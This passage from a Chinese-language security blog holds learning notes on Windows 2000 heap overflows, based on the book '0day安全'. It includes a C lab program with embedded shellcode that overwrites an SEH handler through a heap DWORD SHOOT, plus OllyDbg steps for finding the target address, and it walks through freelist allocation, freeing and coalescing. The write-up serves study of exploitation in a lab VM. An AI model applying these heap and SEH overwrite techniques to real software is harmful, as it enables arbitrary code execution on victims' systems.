<p>但观察第二行代码，代码会向shellcode前部第5 Byte处写入DWORD 值0x7FFDF020，因此位于shellcode中的\x20\xF0\xFD\x7F会被当做机器码执行，这有可能影响shellcode的正确执行，这种现象叫做<em><strong>指针反射</strong></em>，好在本例中这些指令无关痛痒“，并没有影响shellcode关键代码的执行。</p>
<blockquote><p>但如果在为某个特定漏洞开发exploit时，指针反射发生且目标指针不能当做”无关痛痒“的指令安全地执行过去，那就得开动脑筋使用别的目标，或者使用跳板技术。这也是我介绍了很多种利用思路给大家的原因——要不然就只有自认倒霉了。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P177</cite></footer></blockquote>
<h4 id="2-通过S-E-H（异常处理结构体）实施攻击"><a href="#2-通过S-E-H（异常处理结构体）实施攻击" class="headerlink" title="(2) 通过S.E.H（异常处理结构体）实施攻击"></a>(2) 通过S.E.H（异常处理结构体）实施攻击</h4><h5 id="1-S-E-H利用原理"><a href="#1-S-E-H利用原理" class="headerlink" title="1) S.E.H利用原理"></a>1) S.E.H利用原理</h5><blockquote><p>操作系统或程序运行时，难免会遇到各种各样的错误，为了保证系统在遇到错误时不至于崩溃了，仍能够健壮稳定地继续运行下去，Windows会对运行在其中的程序提供一次补救的机会来处理错误，这种机制就是异常处理机制。</p>
<p>S.E.H即异常处理结构体（Structure Exception Handler），它是Windows异常处理机制所采用的重要数据结构。每个S.E.H包含两个DWORD指针：S.E.H链表指针和异常处理函数句柄，共8个字节，如图6.1.1所示。</p>
<p><img src="/tech/heap-overflow-learning-notes-2/0day_6_1_1.png" alt="《0day安全：软件漏洞分析技术》(第二版) -> P178 -> 图6.1.1" title="《0day安全：软件漏洞分析技术》(第二版) -> P178 -> 图6.1.1"></p>
<p>作为对S.E.H的初步了解，我们现在只需要知道一下几个要点，S.E.H链表如图6.1.2所示。</p>
<p>(1) S.E.H结构体存放在系统栈中。<br>(2) 当线程初始化时，会自动向栈中安装一个S.E.H，作为线程默认的一场处理。<br>(3) 如果程序源代码中使用了<strong>try{}</strong>except{}或者Assert宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个S.E.H来实现异常处理。<br>(4) 栈中一般会同时存在多个S.E.H<br>(5) 栈中的多个S.E.H通过链表指针在栈内由栈顶向栈底串成单向链表，位于链表最顶端的S.E.H通过T.E.B（线程环境块）0字节偏移处的指针标识。<br>(6) 当异常发生时，操作系统会中断程序，并首先从T.E.B的0字节偏移处取出距离栈顶最近的S.E.H，使用异常处理函数句柄所指向的代码来处理异常。<br>(7) 当离”事故现场“最近的异常处理函数运行失败时，将顺着S.E.H链表依次尝试其他的异常处理函数。<br>(8) 如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P178-179</cite></footer></blockquote>
<img src="/tech/heap-overflow-learning-notes-2/0day_6_1_2.png" alt="《0day安全：软件漏洞分析技术》(第二版) -> P179 -> 图6.1.2" title="《0day安全：软件漏洞分析技术》(第二版) -> P179 -> 图6.1.2">
<blockquote><p>从程序设计角度来讲 ，S.E.H就是在系统关闭程序之前，给程序一个预先执行设定的回调函数（call back）的机会。大概明白了S.E.H的工作原理之后 ，聪明的读者朋友们可能已经发现了问题所在。<br>(1) S.E.H存放在栈中，故溢出缓冲区的数据有可能淹没S.E.H。<br>(2) 精心制造的溢出数据可以把S.E.H中异常处理函数的入口地址更改为shellcode的起始地址。<br>(3) 溢出后错误的栈帧或堆块数据往往会触发异常。<br>(4) 当Windows开始处理溢出后的异常时，会错误地把shellcode当作异常处理函数而执行。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P178-179</cite></footer></blockquote>
<h5 id="2-实验-1"><a href="#2-实验-1" class="headerlink" title="2) 实验"></a>2) 实验</h5><p>本实验通过淹没尾块块首，来触发DWORD SHOOT以修改S.E.H中第一个异常处理函数的地址，导致堆溢出产生错误需执行异常处理函数时实际却执行了shellcode。</p>
<p>本实验代码与第五章中代码类似，因此作者没有在随书代码中给出，下面给出我自己修改的版本：</p>
<figure class="highlight c"><figcaption><span>《0day安全：软件漏洞分析技术》(第二版) -> P184</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x16\x01\x1A\x00\x00\x10\x00\x00"</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">"\x88\x06\x36\x00"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">MyExceptionHandler</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line"></span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow, 0x200=512</span></span><br><span class="line">	</span><br><span class="line">	__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">	__try&#123;</span><br><span class="line">		h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	__except(MyExceptionHandler())&#123;&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译环境如下：</p>
<ul>
<li>操作系统：运行于Vmware虚拟机，版本Win 2K SP4 5.00.2195 EN</li>
<li>编译器：Visual C++ 6.0</li>
<li>编译选项：默认选项</li>
<li>build版本：release版</li>
</ul>
<p>可以观察到，本例中shellcode与上例中基本一致，不同之处有二：</p>
<ul>
<li>DWORD SHOOT的目标地址，即shellcode的最后4 Byte，本例中暂为\x90\x90\x90\x90，为异常处理函数地址，在进行一次调试确定后，再替换即可</li>
<li>本例中没有进行上例中对0x7FFDF020处临界区函数RtlEnterCriticalSection()指针的修复，因为本例中并没有改变它。</li>
</ul>
<p>在编译后执行程序之前，先改变OllyDBG设置，不忽略任何异常，如下图:</p>
<img src="/tech/heap-overflow-learning-notes-2/2_2_2_1.png" alt="图2.2.2.1" title="图2.2.2.1">
<p>接着执行程序，在INT3处中断，观察此时栈中的S.E.H chain，View菜单 -&gt; SEH chain，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-2/2_2_2_2.png" alt="图2.2.2.2" title="图2.2.2.2">
<p>但是，这时看到的SEH chain中并没有在我们的程序发生堆溢出异常时需要用到的第一个S.E.H。需要接着执行代码直到调用行的HeapAlloc()函数，这时会出现异常，指令窗口会从用户程序代码转入ntdll.dll中的内核代码，此时再观察S.E.H chain，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-2/2_2_2_3.png" alt="图2.2.2.3" title="图2.2.2.3">
<p>观察上图，0x0012FF2C即为处理本程序第一个异常的S.E.H的地址，前面介绍过，S.E.H是个结构体，其中先后包含着下一个S.E.H的指针和异常处理函数指针，因此，我们DWORD SHOOT的目标地址为 (0x0012FF2C + 4) = 0x0012FF30。</p>
<p>接着，修改C代码第18行shellcode中DWORD SHOOT的目标地址为\x30\xFF\x12\x00，注释掉第33行的INT3中断，重新编译执行，成功弹窗。</p>
<p>可以看到，这次我们依然需要注释掉INT3，否则编译执行后进入OllyDBG调试后运行，程序是不会正常弹窗的，其原因在0day书中后文中有提到：</p>
<blockquote><p>当异常发生时，系统会顺着S.E.H链表搜索能够处理异常的句柄；一旦找到了恰当的句柄，系统会将已经遍历过的S.E.H中的异常处理函数再调用一遍，这个过程就是所谓的unwind操作，第二轮地调用就是unwind调用。</p>
<p>unwind操作通过kernel32.dll中的一个导出函数RtlUnwind实现，实际上kernel32.dll会转而再去调用ntdll.dll中的同名函数。</p>
<p>最后，还要堆栈中的异常处理做最后一点补充：在使用回调函数之前，系统会判断当前是否处于调试状态，如果处于调试状态，将把异常交给调试器处理。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P188-190</cite></footer></blockquote>
<p>从上文的解释就可以明白为什么我们的代码会触发异常后会进入ntdll的代码执行，而且也能解释为什么保留INT3编译执行后不会弹窗了，因为在处理异常时系统检测到当前处于调试器中，因此把该异常交给调试器处理了，而OllyDBG跟系统处理异常的方式不同，它并没有调用系统的异常处理函数，因此我们的shellcode没有得到执行。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[堆溢出学习笔记(Win2K) (上)]]></title>
      <url>http://dog.wtf/tech/heap-overflow-learning-notes-1/</url>
      <content type="html"><![CDATA[<ul>
<li>Title(EN): <em><strong>Heap Overflow Learning Notes(Win2K) #1</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<p>最近在啃《0day安全：软件漏洞分析技术》（第二版）一书，打算入门二进制漏洞分析。书中第五章“堆溢出利用”较前几章难度有所增大，原因在于堆结构较之前学习的栈更复杂，第五章中的例子涵盖了堆的分布、堆块分配和释放、堆溢出利用，利用堆溢出进行攻击的例子是通过修改P.E.B（进程环境块）中指向RtlEnterCriticalSection()函数的指针，该函数在程序退出时被调用。在调试完所有例子以后，对堆的内部细节和堆溢出利用终于有了些许的理解。</p>
<p>第六章中也涉及到堆溢出利用，不过此处是利用Windows异常处理机制S.E.H（异常处理结构体）来实现攻击的，看完后打算调试一遍，发现几天前通过调试建立的对内存中堆分布和操作的理解都忘得差不多了，这时候终于体会到 <em><strong>学习过程中根据自己的体会做一些重要笔记并且据此定期复习的重要性</strong></em>，因此有了本篇。</p>
<p>希望这是个好的开头，提醒自己谨记对于复杂的重难点，要以日志的形式形成学习笔记，以供日后温故知新。</p>
<p>关于堆以及P.E.B、S.E.H等机制的介绍，0day书中已经非常系统详尽，本文不再赘述，这里仅给出我的实验调试过程，记录其中踩的坑以及一些体会，因此以过程截图为主，相关简述为辅。第六章中堆的例子作者并没有给出相关代码及过程细节，这里也会附上。由于初学，文中难免存在错误，欢迎指正。</p>
<h2 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00 准备工作"></a>0x00 准备工作</h2><blockquote><p>调试堆与调试栈不同，不能直接用调试器OllyDBG、WinDBG来加载程序，否则堆管理函数会检测到当前进程处于调试状态，而使用调试态堆管理策略。</p>
<p>调试态对管理策略和常态堆管理策略有很大差异。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P153</cite></footer></blockquote>
<p>因此需要防止程序运行后进入调试态，按照书中所述以如下方式设置：</p>
<ul>
<li>设置OllyDBG为默认调试器：OllyDBG -&gt; Options菜单 -&gt; Just-in-time debugging</li>
</ul>
<img src="/tech/heap-overflow-learning-notes-1/0_1.png" alt="图0.1" title="图0.1">
<ul>
<li>设置OllyDBG 不捕获INT3中断：OllyDBG -&gt; Options菜单 -&gt; Debugging options</li>
</ul>
<img src="/tech/heap-overflow-learning-notes-1/0_2.png" alt="图0.2" title="图0.2">
<a id="more"></a>
<h2 id="0x01-初识堆"><a href="#0x01-初识堆" class="headerlink" title="0x01 初识堆"></a>0x01 初识堆</h2><hr>
<blockquote><p>在Windows中，占用态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。其中最重要的堆表有两种：空闲双向链表Freelist（以下简称空表）和 快速单向链表Lookaside（以下简称快表）。</p>
<p>堆的操作中可以分为堆块分配、堆块释放和堆块合并（Coalesce）三种。其中，“分配”和“释放”是在程序<em>（即在用户代码中）</em>提交申请和执行的，而堆块合并则是有对管理系统自己完成的。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P147 & P149</cite></footer></blockquote>
<p>下面观察空表的分配、释放及合并，快表中没有合并操作，因此观察它的分配及释放。</p>
<h3 id="1-空闲双向链表Freelist"><a href="#1-空闲双向链表Freelist" class="headerlink" title="1. 空闲双向链表Freelist"></a>1. 空闲双向链表Freelist</h3><p>示例代码如下</p>
<figure class="highlight c"><figcaption><span>《0day安全：软件漏洞分析技术》(第二版) -> P152 -> heap_debug.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span><br><span class="line">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span><br><span class="line">		</span><br><span class="line">POC code of chapter 6.2 in book "Vulnerability Exploit and Analysis Technique"</span><br><span class="line"> </span><br><span class="line">file name	: heap_debug.c</span><br><span class="line">author		: failwest  </span><br><span class="line">date		: 2007.04.04</span><br><span class="line">description	: demo show of how heap works</span><br><span class="line">Noticed		:	1 only run on windows 2000</span><br><span class="line">				2 complied with VC 6.0</span><br><span class="line">				3 build into release version</span><br><span class="line">				4 only used for run time debugging</span><br><span class="line">version		: 1.0</span><br><span class="line">E-mail		: failwest@gmail.com</span><br><span class="line">		</span><br><span class="line">	Only for educational purposes    enjoy the fun from exploiting :)</span><br><span class="line">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1,h2,h3,h4,h5,h6;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">5</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">6</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">19</span>);</span><br><span class="line">	h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//free block and prevent coaleses</span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//free to freelist[2] </span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3); <span class="comment">//free to freelist[2] </span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//free to freelist[4]</span></span><br><span class="line">	</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h4); <span class="comment">//coalese h3,h4,h5,link the large block to freelist[8]</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译环境如下：</p>
<ul>
<li>操作系统：运行于Vmware虚拟机，版本Win 2K SP4 5.00.2195 EN</li>
<li>编译器：Visual C++ 6.0</li>
<li>编译选项：默认选项</li>
<li>build版本：release版</li>
</ul>
<p>运行程序，由于INT3中断产生异常，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_1.png" alt="图1.1.1" title="图1.1.1">
<p>选择Cancel以加载默认调试器OllyDBG。</p>
<h4 id="1-寻找代码HeapCreate-所创建的堆"><a href="#1-寻找代码HeapCreate-所创建的堆" class="headerlink" title="(1) 寻找代码HeapCreate()所创建的堆"></a>(1) 寻找代码HeapCreate()所创建的堆</h4><p>进入OllyDBG后，单击下图中的M按钮，以查看程序当前的内存映射状态：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_2.png" alt="图1.1.2" title="图1.1.2">
<p>与上图对应的0day书中图5.2.5指出了内存映射Memory Map中进程堆、malloc使用堆、实验中HeapCreate()创建的堆的起始地址，作者没有说明后2个是如何判断的，我的理解如下：</p>
<ul>
<li>malloc使用堆：这里我还无法判断，因为上图的内存映射情况跟书中的图有较大不同。</li>
<li>实验中HeapCreate()创建的堆：可用根据大小为0x1000以及Type为Priv来筛选，0x0012D000虽然也满足，但是地址很小，在线程及进程堆附近，应该不是用户所创建的堆。因此可用筛选出0x00360000为程序代码创建的堆。</li>
</ul>
<p>上面讨论的是只根据观察Memory map来识别各种类型的堆，其实本例中要判断HeapCreate()创建的堆可直接根据当前汇编代码运行到INT3时EAX的值来判断，即为0x00360000，因为在INT3代码之前刚刚调用了HeapCreate()函数，并且返回了创建的堆的其实地址，该值正存储在EAX中，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_3.png" alt="图1.1.3" title="图1.1.3">
<h4 id="2-观察堆表信息"><a href="#2-观察堆表信息" class="headerlink" title="(2) 观察堆表信息"></a>(2) 观察堆表信息</h4><blockquote><p>空闲堆块的块首中包含一对重要指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分为128条。</p>
<p>堆区一开始的堆表区中有一个128项的指针数组，被称做空表索引（Freelist array）。该数组的每一项包括两个指针，用于标识一个空表。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P147</cite></footer></blockquote>
<p>在内存查看窗口中，Ctrl+G来到地址0x00360000处，观察内存，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_4.png" alt="图1.1.4" title="图1.1.4">
<p>按照书中介绍，从0x00360000开始，堆表中包含的信息依次为</p>
<ul>
<li>段表索引 Segment List</li>
<li>虚表索引 Virtual Allocation list</li>
<li>空表使用标识 freelist usage bitmap</li>
<li>空表索引区</li>
</ul>
<p>这里只关心从偏移0x178处(距离堆起始地址0x00360000的偏移，后文省略)开始的空表索引区，这个区域存放着Freelist数组Freelist[0]~Freelist[127]，每个数组元素大小为8Byte，包含2个4Byte指针，前向指针flink（指向所在链表中下一个堆块）和后向指针blink（指向所在链表中前一个堆块）。</p>
<p>参考书中图5.1.2，空表索引是用来索引不同大小的堆块数据链的。堆块用来存储数据，其最小单位为8 Byte，空闲堆块按照其大小被区分开来，相同大小的空闲堆块被串接起来，形成一个包含若干个同样大小的堆块堆块链。如Freelist[1]指向的是一条由若干个大小都为 1 x 8 Byte的堆块串接起来的堆块数据链，依此类推，Freelist[127]指向的是一条由若干个大小都为 127 x 8 Byte的堆块串接起来的堆块数据链，其中前向指针flink指向的是堆块数据链中的第一个堆块，后向指针blink指向的是最后一个堆块。Freelist[0]较为特殊，它链入所有 大于等于1024 Byte且小于512 KB的堆块，这些堆块按照各自的大小在Freelist[0]中升序串接。</p>
<img src="/tech/heap-overflow-learning-notes-1/0day_5_1_2.png" alt="《0day安全：软件漏洞分析技术》(第二版) -> P148 -> 图5.1.2" title="《0day安全：软件漏洞分析技术》(第二版) -> P148 -> 图5.1.2">
<p>值得一提的是，参考书中图5.2.8和5.2.9，每个完整的堆块的前8 Byte是块首，存储着该块大小、状态等相关信息。</p>
<img src="/tech/heap-overflow-learning-notes-1/0day_5_2_8.png" alt="《0day安全：软件漏洞分析技术》(第二版) -> P156 -> 图5.2.8" title="《0day安全：软件漏洞分析技术》(第二版) -> P156 -> 图5.2.8">
<img src="/tech/heap-overflow-learning-notes-1/0day_5_2_9.png" alt="《0day安全：软件漏洞分析技术》(第二版) -> P157 -> 图5.2.9" title="《0day安全：软件漏洞分析技术》(第二版) -> P157 -> 图5.2.9">
<p>块首之后数据的作用根据该堆块是否空闲有所不同：</p>
<ul>
<li>空闲态堆块中，紧接着块首的8 Byte包含该空闲块的前向指针和后向指针，余下的字节就是实际数据了。</li>
<li>占用态堆块中，块首之后便是实际数据的数据。</li>
</ul>
<p>因此，1个包含8 Byte数据的堆块，在内存中占用的实际空间为16 Byte。当该堆块为空闲态时，8-15 Byte为前向指针和后向指针；当该堆块为占用态时，后8 Byte为实际数据。</p>
<p>我们发现图1.1.4中的空表索引区中除了Freelist[0]中的2个指针都指向0x688，之后每个元素中的前向指针和后向指针都指向该元素的起始地址，这是因为初始状态下的堆是没有的固定大小的空闲块的，除了一个非常大、连续的初始空闲块，即尾块，它正是Freelist[0]的2个指针所指的堆块。</p>
<p>我们来到0x680观察尾块，如下图</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_5.png" alt="图1.1.5" title="图1.1.5">
<p>从上图可以看出，尾块的大小为0x130 x 8 Byte，前后向指针都指向freelist[0]。</p>
<p>这里值得一提的是块首信息中的Self Size的单位是8 Byte，也就是说该Self Size值为1的最小堆数据块占用的内存为 1 x 8 Byte，这是堆块数据的最小占用内存。</p>
<p>注意，尾块块首位于0x680，而非Freelist[0]中指针指向的0x688，因为<strong>空表中的前向指针和后向指针指向的都是堆块中实际数据的内存地址，而非块首的地址。</strong></p>
<h4 id="3-观察堆块的分配"><a href="#3-观察堆块的分配" class="headerlink" title="(3) 观察堆块的分配"></a>(3) 观察堆块的分配</h4><p>继续跟进代码，来观察堆块的分配与释放，但随即遇到一个坑：不管 Debugging options中怎么设置，代码执行到0x0040101D处的INT3之前，继续F8执行INT3，会进入内核代码直到终止，不会继续执行INT3之后的代码。在看雪论坛里看到大家也遇到了这种情况，也没有太好的解决办法。问题肯定出在汇编代码int3，因此我的解决办法是手动将int3改变为nop，执行空指令，这样就可以继续执行后面的代码了，但是也有不方便的地方，每次重启程序执行到该处都得手动修改此处。</p>
<p>连续几次F8代码执行到0x0040102B处，即完成h1堆内存分配之后，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_6.png" alt="图1.1.6" title="图1.1.6">
<p>从上图中可以观察到，h1的堆内存地址是之前的空闲尾块的起始地址0x688，那原来的尾块何去何从？这时可以再观察一下空表索引区，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_7.png" alt="图1.1.7" title="图1.1.7">
<p>从上图可以看到，Freelist[0]所指向的空闲尾块的起始地址变为0x698。再到地址0x680进行观察，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_8.png" alt="图1.1.8" title="图1.1.8">
<p>可以看到，尾块变小到 0x12E x 8 Byte了，缩小了(0x130 - 0x12E) x 8 Byte = 16 Byte，这16 Byte即为h1所用，虽然在C代码中h1申请大小仅为3 Byte，但是据前所述，堆块数据的最小占用内存为 8 Byte，因此包括块首的h1还是占用了16 Byte的内存空间。由于h1仅申请了3 Byte，因此0x688的前4 Byte被置为0，而后4 Byte不做改变也不会被使用，所以其值仍为之前的尾块的后向指针的值。</p>
<p>随后的h2-h6分配过程类似，不再赘述，下面两图给出h6分配完毕后的空表索引区及对数据区的状态:</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_9.png" alt="图1.1.9" title="图1.1.9">
<img src="/tech/heap-overflow-learning-notes-1/1_1_10.png" alt="图1.1.10" title="图1.1.10">
<h4 id="4-观察堆块的释放"><a href="#4-观察堆块的释放" class="headerlink" title="(4) 观察堆块的释放"></a>(4) 观察堆块的释放</h4><p>接着观察堆块的释放，C代码中首先释放的是3个不相邻的堆块h1 h3 h5，由于它们不连续，因此不会发生合并。</p>
<p>将汇编代码执行到h5释放完毕，h6开始释放之前，观察空表索引区及堆数据区的状态：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_11.png" alt="图1.1.11" title="图1.1.11">
<img src="/tech/heap-overflow-learning-notes-1/1_1_12.png" alt="图1.1.12" title="图1.1.12">
<p>由于h1和h3的Self Size都为2且不相邻，当它们被释放时会先后与Freelist[2]串联构成双向链表，具体的链接方式为</p>
<ul>
<li>flink: FreeList[2] -&gt; h1 -&gt; h3 -&gt; FreeList[2]</li>
<li>blink: FreeList[2] -&gt; h3 -&gt; h1 -&gt; FreeList[2]</li>
</ul>
<p>释放后的h5被单独串联到Freelist[4]。</p>
<p>可以观察到在分配及释放前后，h1 h3 h5的块首中从左至右第6 Byte的数据由0x01变为0x00，该字节数据为堆块标识，值0x01表示该块处于Busy状态。处于Busy状态的空闲堆块不会被合并，而0x00状态的空闲堆块在合适的时候会被系统自动合并。</p>
<h4 id="5-观察堆块的合并"><a href="#5-观察堆块的合并" class="headerlink" title="(5) 观察堆块的合并"></a>(5) 观察堆块的合并</h4><p>继续执行释放h4的代码，当h4被释放后，观察空表索引区及堆数据区：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_13.png" alt="图1.1.13" title="图1.1.13">
<img src="/tech/heap-overflow-learning-notes-1/1_1_14.png" alt="图1.1.14" title="图1.1.14">
<p>h4被释放后，系统并不会把它与Freelist[4]串联，因为系统检测到h4 前与h3 后与h4相邻，会将它们合并，合并后新空闲块的大小为(2+2+4) x 8 Byte = 8 x 8 Byte，因此新块的Self Size为8。</p>
<p>同时观察空表索引区，由于h3被“拿走”，与Freelist[2]串联的只剩下了h1，原先与Freelist[4]串联的h5也被“拿走”，因此Freelist[4]中的指针再次指向了它自身，而合并得到的Self Size为8的新块与Freelist[8]进行了串接。 </p>
<h3 id="2-快速单向链表Lookaside"><a href="#2-快速单向链表Lookaside" class="headerlink" title="2. 快速单向链表Lookaside"></a>2. 快速单向链表Lookaside</h3><blockquote><p>快表是Windows用来加速堆块分配而采用的一种堆表。这里之所以把它叫做“快表”是因为这类单向链表中从来不会发生堆块合并（其中的空闲块块首被设置为占用态，用来防止堆块合并）。</p>
<p>快表也有128条，组织结构与空表类似，只是其中的堆块按照单链表组织。快表总是被初始化为空，而且每条快表最多只有4个节点，故很快就会被填满。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P148-149</cite></footer></blockquote>
<p>快表结构如下图：</p>
